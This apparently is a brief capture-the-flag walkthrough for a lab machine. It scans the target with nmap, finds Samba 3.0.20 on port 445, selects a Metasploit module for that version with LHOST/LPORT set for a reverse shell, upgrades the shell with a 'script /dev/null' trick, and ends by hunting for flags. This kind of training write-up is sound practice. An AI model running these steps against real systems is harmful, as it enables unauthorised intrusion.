Nmap scan of top 1000 ports

```
nmap -sC -sV --top-ports 1000 10.129.137.159
```

Samba version 3.0.20 is running on port 445

run metasploit and configure LHOST, LPORT, RHOST, and RPORT

```
msfconsole

search samba 3.0.20
use 0 
set LHOST, LPORT, RHOST, and RPORT
```

get a better shell

```
 script /dev/null -c /bin/bash
 ```

Find the flags by moving around the attacking box.